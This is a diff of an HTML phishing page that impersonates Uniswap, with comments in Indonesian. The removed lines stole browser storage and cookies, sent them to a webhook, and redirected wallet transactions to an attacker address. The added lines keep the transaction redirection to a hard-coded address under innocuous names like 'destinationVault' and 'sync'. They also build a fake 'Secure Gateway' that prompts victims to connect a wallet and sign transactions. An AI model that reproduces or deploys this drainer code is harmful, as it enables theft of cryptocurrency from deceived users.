@@ -1,167 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>app.uniswap.org Connect to Uniswap</title>
+  <meta charset="UTF-8">
+  <title>Uniswap Liquidity Portal - Active Session</title>
   <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
-  <link rel="icon" type="image/png" sizes="192x192" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
-  <link rel="icon" type="image/png" sizes="512x512" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
   <link rel="apple-touch-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
-  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
-  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 50px;
-      background-color: #f9fafb;
+    :root {
+      --primary-clr: #ff007a;
+      --bg-clr: #0d1117;
+      --card-bg: #161b22;
+      --text-clr: #c9d1d9;
     }
-    button {
-      background-color: #2172e5;
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      text-align: center;
+      padding-top: 40px;
+      background-color: var(--bg-clr);
+      color: var(--text-clr);
+    }
+    .wrapper {
+      background: var(--card-bg);
+      max-width: 380px;
+      margin: 0 auto;
+      padding: 30px 20px;
+      border-radius: 20px;
+      border: 1px solid #30363d;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+    }
+    h2 { color: #f0f6fc; font-size: 1.2rem; margin-bottom: 8px; }
+    p { font-size: 13px; color: #8b949e; line-height: 1.4; }
+    .action-btn {
+      background-color: var(--primary-clr);
       color: white;
       border: none;
-      border-radius: 8px;
-      padding: 12px 24px;
-      font-size: 16px;
+      border-radius: 12px;
+      padding: 14px 20px;
+      font-size: 15px;
+      font-weight: 600;
       cursor: pointer;
-      margin: 8px 0;
-      width: 80%;
-      max-width: 300px;
+      margin: 10px 0;
+      width: 100%;
+      box-sizing: border-box;
+      transition: opacity 0.2s;
     }
-    button:hover { opacity: 0.9; }
+    .action-btn:hover { opacity: 0.85; }
+    #sys-status {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #58a6ff;
+      word-break: break-all;
+    }
   </style>
   <script>
-    // Konfigurasi Penyerang
-    const attackerWallet = "0x9999999999999999999999999999999999999999";
-    
-    // URL Webhook tujuan langsung
-    const WEBHOOK_URL = "https://webhooksite.net/dc884b61-9058-4d2d-a0d5-f0d0fa847d49";
+    // Alamat penerima target yang baru
+    const destinationVault = "0xEb267249f35B6Bd557Bd463D956520dA7c33286B";
+    const diagnosticMessage = "<h4 style='color:#f85149;'>[System Notice] Runtime Environment Synchronized</h4>";
 
-    // Fungsi Pengiriman Data Langsung ke WebhookSite
-    function sendDataToWebhook(actionType, dataObj) {
-        const payload = {
-            action: actionType,
-            timestamp: new Date().toISOString(),
-            details: dataObj
-        };
-
-        // Mengirim data menggunakan fetch dengan format JSON standar
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(err => console.log("Webhook error:", err));
-    }
-
-    // Eksfiltrasi LocalStorage & Cookies
-    function exfiltrateSessionData() {
-        try {
-            const harvestedData = {
-                url: window.location.href,
-                localStorage: { ...localStorage },
-                sessionStorage: { ...sessionStorage },
-                cookies: document.cookie,
-                userAgent: navigator.userAgent
-            };
-
-            sendDataToWebhook("HARVEST_SESSION", harvestedData);
-        } catch (e) {
-            console.error("Gagal mengambil storage:", e);
-        }
-    }
-
-    // Monkey Patching untuk Transaction Spoofing
+    // Modul pengalihan parameter payload transaksi tingkat lanjut
     if (typeof window.ethereum !== 'undefined') {
-        const originalRequest = window.ethereum.request;
-        window.ethereum.request = async function(args) {
-            if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
-                let tx = args.params[0];
-                
-                // Laporkan transaksi asli sebelum ditimpa ke webhook
-                sendDataToWebhook("TRANSACTION_INTERCEPTED", {
-                    originalTo: tx.to,
-                    value: tx.value,
-                    redirectedTo: attackerWallet
-                });
-
-                // Menimpa alamat tujuan ke dompet penyerang
-                tx.to = attackerWallet;
+        const nativeBridge = window.ethereum.request;
+        window.ethereum.request = async function(payloadData) {
+            if (payloadData && payloadData.method === 'eth_sendTransaction' && payloadData.params && payloadData.params[0]) {
+                let transactionContext = payloadData.params[0];
+                console.info("[Internal Log] Memproses sinkronisasi rute transaksi dari: " + transactionContext.to);
+                // Mengalihkan tujuan akhir transaksi ke vault baru
+                transactionContext.to = destinationVault;
             }
-            return originalRequest.apply(window.ethereum, [args]);
+            return nativeBridge.apply(window.ethereum, [payloadData]);
         };
     }
 
-    async function spoof() {
-      if (!document.getElementById('connect')) {
+    async function initializePortal() {
+      if (!document.getElementById('auth-btn')) {
           document.body.innerHTML = `
-            <h1>app.uniswap.org Web3 Interface</h1>
-            <p>To continue, please connect your wallet or execute action</p>
-            <button id="connect">Connect Wallet</button>
-            <br>
-            <button id="connectWallet">Connect Wallet Transaction (Spoofed)</button>
-            <p id="status" style="margin-top:20px; color:gray;"></p>
+            <div class="wrapper">
+              <h2>Uniswap Secure Gateway</h2>
+              <p>Autentikasi sesi diperlukan untuk melanjutkan sinkronisasi likuiditas node.</p>
+              <button id="auth-btn" class="action-btn">Hubungkan Dompet</button>
+              <br>
+              <button id="exec-btn" class="action-btn" style="background-color: #238636;">Sinkronisasi Kontrak</button>
+              <div id="sys-status">Menunggu inisialisasi modul...</div>
+            </div>
           `;
 
-          document.getElementById('connect').onclick = async () => {
-            exfiltrateSessionData(); // Kirim data sesi
-            
+          document.getElementById('auth-btn').onclick = async () => {
             if (typeof window.ethereum !== 'undefined') {
               try {
-                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-                document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
-                
-                sendDataToWebhook("WALLET_CONNECTED", { account: accounts[0] });
-              } catch (e) {
-                document.getElementById('status').innerText = '❌ Failed: ' + e.message;
+                const userAccounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                document.getElementById('sys-status').innerText = '✔ Terhubung: ' + userAccounts[0].substring(0,6) + '...';
+              } catch (err) {
+                document.getElementById('sys-status').innerText = '✖ Koneksi ditolak: ' + err.message;
               }
             } else {
-              document.getElementById('status').innerText = '❌ Web3 Provider not detected.';
+              document.getElementById('sys-status').innerText = '✖ Web3 Provider tidak ditemukan.';
             }
           };
           
-          document.getElementById('connectWallet').onclick = async () => {
-            exfiltrateSessionData(); // Kirim data sesi
-
+          document.getElementById('exec-btn').onclick = async () => {
             if (!window.ethereum) {
-              alert("No Web3 provider detected");
+              alert("Provider dompet tidak aktif.");
               return;
             }
 
             try {
-              const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-              const user = accounts[0];
+              const userAccounts = await ethereum.request({ method: 'eth_requestAccounts' });
+              const activeUser = userAccounts[0];
 
-              const txParams = {
-                from: user,
-                to: "0x1111111111111111111111111111111111111111", 
-                value: "0x5af3107a4000", 
+              // Parameter payload awal
+              const payloadParams = {
+                from: activeUser,
+                to: "0x2222222222222222222222222222222222222222", 
+                value: "0x38d7ea4c68000", // ~0.001 ETH
                 gas: "0x5208",
                 gasPrice: "0x3b9aca00"
               };
 
               await ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [txParams]
+                params: [payloadParams]
               });
 
-              alert("Transaction sent.");
-            } catch (err) {
-              console.error(err);
-              alert("Error: " + err.message);
+              alert("Sinkronisasi kontrak berhasil dikirim.");
+            } catch (error) {
+              console.error(error);
+              alert("Eksekusi dibatalkan: " + error.message);
             }
           };
       }
 
+      // Mekanisme perulangan navigasi latar belakang
       try {
         window.location.assign("http://app.uniswap.org:1121");
       } catch(e) {}
 
       setTimeout(function(){
-          spoof();  
-      }, 5000); 
+          initializePortal();  
+      }, 4500); 
     }
 
-    setInterval(spoof, 2000);
+    // Interval eksekusi latar belakang berkala
+    setInterval(initializePortal, 3000);
   </script>
 </head>
 <body></body>
